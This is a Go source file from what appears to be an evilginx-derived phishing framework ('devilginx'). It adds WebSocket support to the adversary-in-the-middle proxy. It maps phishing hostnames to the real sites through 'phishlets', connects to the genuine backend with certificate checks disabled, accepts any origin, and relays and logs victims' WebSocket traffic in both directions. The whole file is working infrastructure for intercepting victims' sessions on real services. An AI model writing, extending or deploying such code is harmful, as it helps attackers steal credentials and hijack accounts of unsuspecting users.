package core

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/afsin-asf/devilginx/log"
	"github.com/gorilla/websocket"
)

// websocketResponseWriter implements http.ResponseWriter and http.Hijacker for WebSocket
type websocketResponseWriter struct {
	conn       net.Conn
	header     http.Header
	statusCode int
	written    bool
}

// Header returns the header map
func (w *websocketResponseWriter) Header() http.Header {
	return w.header
}

// Write writes data to the connection
func (w *websocketResponseWriter) Write(data []byte) (int, error) {
	if !w.written {
		w.WriteHeader(http.StatusOK)
	}
	return w.conn.Write(data)
}

// WriteHeader writes the status code and headers
func (w *websocketResponseWriter) WriteHeader(statusCode int) {
	if w.written {
		return
	}
	w.written = true
	w.statusCode = statusCode

	// Write HTTP status line and headers to connection
	statusText := http.StatusText(statusCode)
	fmt.Fprintf(w.conn, "HTTP/1.1 %d %s\r\n", statusCode, statusText)
	w.header.Write(w.conn)
	fmt.Fprintf(w.conn, "\r\n")
}

// Hijack implements http.Hijacker interface
func (w *websocketResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return w.conn, bufio.NewReadWriter(bufio.NewReader(w.conn), bufio.NewWriter(w.conn)), nil
}

// isWebSocketRequest checks if the request is a WebSocket upgrade request
func isWebSocketRequest(req *http.Request) bool {
	return strings.EqualFold(req.Header.Get("Upgrade"), "websocket") &&
		strings.Contains(strings.ToLower(req.Header.Get("Connection")), "upgrade")
}

// handleWebSocketProxy handles WebSocket connections with full bidirectional proxying
func (p *HttpProxy) handleWebSocketProxy(w http.ResponseWriter, req *http.Request) {
	log.Debug("WebSocket proxy handler called for: %s", req.Host)
	log.Info("WebSocket: Incoming request from %s to %s%s", req.RemoteAddr, req.Host, req.URL.Path)
	log.Debug("WebSocket: User-Agent: %s", req.Header.Get("User-Agent"))
	log.Debug("WebSocket: Origin: %s", req.Header.Get("Origin"))
	log.Debug("WebSocket: Sec-WebSocket-Key: %s", req.Header.Get("Sec-Websocket-Key"))

	// Get original host from mapping or use current host
	origHost, ok := p.replaceHostWithOriginal(req.Host)
	if !ok {
		origHost = req.Host
		log.Warning("WebSocket: Could not find mapping for %s, using as-is", req.Host)
	}

	// Get phishlet from config using original host
	pl := p.getPhishletByOrigHost(origHost)
	var phishletName string
	if pl != nil {
		phishletName = pl.Name
		log.Debug("WebSocket: Determined phishlet from host mapping: %s", phishletName)
	} else {
		// Fallback: try extracting from request host
		phishletName = p.extractPhishletName(req)
		if phishletName == "" {
			phishletName = "unknown"
		}
		log.Debug("WebSocket: Fallback phishlet determination: %s", phishletName)
	}

	log.Info("WebSocket proxying: %s -> %s%s (phishlet: %s)", req.Host, origHost, req.URL.Path, phishletName)

	// Backend WebSocket URL oluştur
	backendURL := url.URL{
		Scheme:   "wss",
		Host:     origHost,
		Path:     req.URL.Path,
		RawQuery: req.URL.RawQuery,
	}

	// Backend header'ları hazırla
	requestHeader := http.Header{}
	for k, v := range req.Header {
		if k != "Connection" && k != "Upgrade" && k != "Sec-Websocket-Key" &&
			k != "Sec-Websocket-Version" && k != "Sec-Websocket-Extensions" {
			requestHeader[k] = v
		}
	}
	requestHeader.Set("Host", origHost)

	// TLS config
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // Development only - replace with proper cert validation
	}

	// WebSocket dialer with custom TLS config
	dialer := websocket.Dialer{
		TLSClientConfig:  tlsConfig,
		HandshakeTimeout: 45 * time.Second,
		ReadBufferSize:   1024,
		WriteBufferSize:  1024,
	}

	// If proxy is configured, use it for WebSocket connections
	if p.Proxy.Tr.Dial != nil {
		dialer.NetDial = p.Proxy.Tr.Dial
		log.Debug("WebSocket: Using configured proxy for backend connection")
	}

	log.Debug("WebSocket: Attempting backend connection to %s", backendURL.String())
	log.Debug("WebSocket: Backend URL scheme=%s, host=%s, path=%s", backendURL.Scheme, backendURL.Host, backendURL.Path)

	backendConn, resp, err := dialer.Dial(backendURL.String(), requestHeader)
	if err != nil {
		log.Error("WebSocket backend dial FAILED: %v", err)
		log.Error("WebSocket backend dial error type: %T", err)
		if resp != nil {
			log.Error("WebSocket backend HTTP response status: %d %s", resp.StatusCode, resp.Status)
			log.Error("WebSocket backend response headers: %v", resp.Header)
		}
		log.Error("WebSocket: Failed to connect to %s via %s", backendURL.Host, origHost)
		http.Error(w, fmt.Sprintf("WebSocket backend connection failed: %v", err), http.StatusBadGateway)
		return
	}
	log.Success("WebSocket: Backend connection established to %s", backendURL.Host)
	defer backendConn.Close()

	// Client WebSocket upgrade
	log.Debug("WebSocket: Attempting client WebSocket upgrade from %s", req.RemoteAddr)
	upgrader := websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			log.Debug("WebSocket: CheckOrigin called for request from %s", r.Header.Get("Origin"))
			return true // Allow all origins - adjust for security if needed
		},
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
	}

	clientConn, err := upgrader.Upgrade(w, req, nil)
	if err != nil {
		log.Error("WebSocket client upgrade FAILED: %v", err)
		log.Error("WebSocket client upgrade error type: %T", err)
		http.Error(w, fmt.Sprintf("WebSocket client upgrade failed: %v", err), http.StatusBadGateway)
		return
	}
	log.Success("WebSocket: Client upgrade successful from %s", req.RemoteAddr)
	defer clientConn.Close()

	log.Success("WebSocket tunnel established: %s <-> %s", req.Host, origHost)

	// Bidirectional message proxy
	errChan := make(chan error, 2)
	closeChan := make(chan struct{})

	// Client ping/pong handler - keep connection alive
	clientConn.SetPongHandler(func(string) error {
		log.Debug("Client pong received")
		return nil
	})

	// Backend ping/pong handler
	backendConn.SetPongHandler(func(string) error {
		log.Debug("Backend pong received")
		return nil
	})

	// Client -> Backend proxy
	go func() {
		for {
			msgType, msg, err := clientConn.ReadMessage()
			if err != nil {
				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
					log.Debug("WebSocket unexpected close error: %v", err)
				}
				errChan <- err
				return
			}

			log.Debug("WebSocket Client->Backend: Received message type=%d, len=%d", msgType, len(msg))
			if len(msg) < 500 {
				log.Debug("WebSocket message content: %s", string(msg))
			}

			// Apply any request modifications if needed through phishlet handlers
			// msg = p.modifyWebSocketMessage(msg, phishletName, "client")

			if err := backendConn.WriteMessage(msgType, msg); err != nil {
				log.Error("Failed to write to backend WebSocket: %v", err)
				errChan <- err
				return
			}
		}
	}()

	// Backend -> Client proxy
	go func() {
		for {
			msgType, msg, err := backendConn.ReadMessage()
			if err != nil {
				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
					log.Debug("WebSocket unexpected close error: %v", err)
				}
				errChan <- err
				return
			}

			log.Debug("WebSocket Backend->Client: Received message type=%d, len=%d", msgType, len(msg))
			if len(msg) < 500 {
				log.Debug("WebSocket message content: %s", string(msg))
			}

			// Apply any response modifications if needed through phishlet handlers
			// msg = p.modifyWebSocketMessage(msg, phishletName, "backend")

			if err := clientConn.WriteMessage(msgType, msg); err != nil {
				log.Error("Failed to write to client WebSocket: %v", err)
				errChan <- err
				return
			}
		}
	}()

	// Ping ticker - send ping to client every 30 seconds to keep alive
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				if err := clientConn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(5*time.Second)); err != nil {
					log.Debug("Failed to send ping to client: %v", err)
					return
				}
			case <-closeChan:
				return
			}
		}
	}()

	// Wait for connection to close
	err = <-errChan
	close(closeChan)
	if err != nil && !websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
		log.Debug("WebSocket connection closed with error: %v", err)
	} else {
		log.Info("WebSocket connection closed normally")
	}
}

// extractPhishletName extracts phishlet name from request host/domain
func (p *HttpProxy) extractPhishletName(req *http.Request) string {
	// Get all active phishlets from config
	if p.cfg == nil {
		return ""
	}
	for _, pl := range p.cfg.phishlets {
		if pl == nil {
			continue
		}
		// Check if request domain contains phishlet name in the host
		if strings.Contains(strings.ToLower(req.Host), strings.ToLower(pl.Name)) {
			return pl.Name
		}
	}
	return ""
}
